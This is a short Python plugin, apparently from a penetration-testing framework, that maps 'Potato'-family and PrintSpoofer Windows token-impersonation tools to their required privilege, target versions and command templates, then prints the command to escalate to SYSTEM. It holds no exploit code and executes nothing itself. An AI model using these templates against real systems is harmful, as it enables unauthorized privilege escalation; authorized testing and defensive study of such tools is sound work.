"""Token impersonation  -  Potato family, PrintSpoofer, JuicyPotato, GodPotato."""
import sys
from typing import Any

MANIFEST = {
    "capability_id": "adxpl.privesc.token_impersonation.v1",
    "safety_class": "ACTIVE",
    "requires_authorization": True,
    "side_effects": ["token_manipulation", "privilege_escalation"],
    "output_schema": "xpl.finding.v1",
    "mitre": ["T1134.001"],
}

POTATO_VARIANTS = {
    "juicypotato": {
        "requires": "SeImpersonatePrivilege",
        "targets": "Windows Server 2008-2016",
        "cmd": 'JuicyPotato.exe -l {port} -p {cmd} -t * -c {clsid}',
    },
    "rottenpotato": {
        "requires": "SeImpersonatePrivilege",
        "targets": "Windows Server 2008-2016",
        "cmd": 'rottenpotato.exe',
    },
    "sweetpotato": {
        "requires": "SeImpersonatePrivilege",
        "targets": "Windows 10/Server 2019+",
        "cmd": 'SweetPotato.exe -e EfsRpc -p {cmd}',
    },
    "godpotato": {
        "requires": "SeImpersonatePrivilege",
        "targets": "Windows 2012-2022",
        "cmd": 'GodPotato.exe -cmd "{cmd}"',
    },
    "printspoofer": {
        "requires": "SeImpersonatePrivilege",
        "targets": "Windows 10/Server 2016-2019",
        "cmd": 'PrintSpoofer.exe -c "{cmd}"',
    },
    "efspotato": {
        "requires": "SeImpersonatePrivilege",
        "targets": "Windows 10/Server 2019+",
        "cmd": 'EfsPotato.exe "{cmd}"',
    },
}


def run(args: Any) -> int:
    variant = getattr(args, "potato", "godpotato")
    command = getattr(args, "command", "cmd.exe")
    port = getattr(args, "port", "1337")
    clsid = getattr(args, "clsid", "{4991d34b-80a1-4291-83b6-3328366b9097}")

    if variant == "list":
        print("[*] Token impersonation variants:")
        for name, info in POTATO_VARIANTS.items():
            print("  {}  -  {} ({})".format(name, info["targets"], info["requires"]))
        return 0

    info = POTATO_VARIANTS.get(variant, POTATO_VARIANTS["godpotato"])
    cmd = info["cmd"].format(cmd=command, port=port, clsid=clsid)

    print(f"[*] Token impersonation: {variant} → SYSTEM")
    print("  Requires: {}".format(info["requires"]))
    print("  Targets:  {}".format(info["targets"]))
    print(f"  Command:  {cmd}")
    print("\n[*] Check privilege: whoami /priv | findstr Impersonate")
    return 0
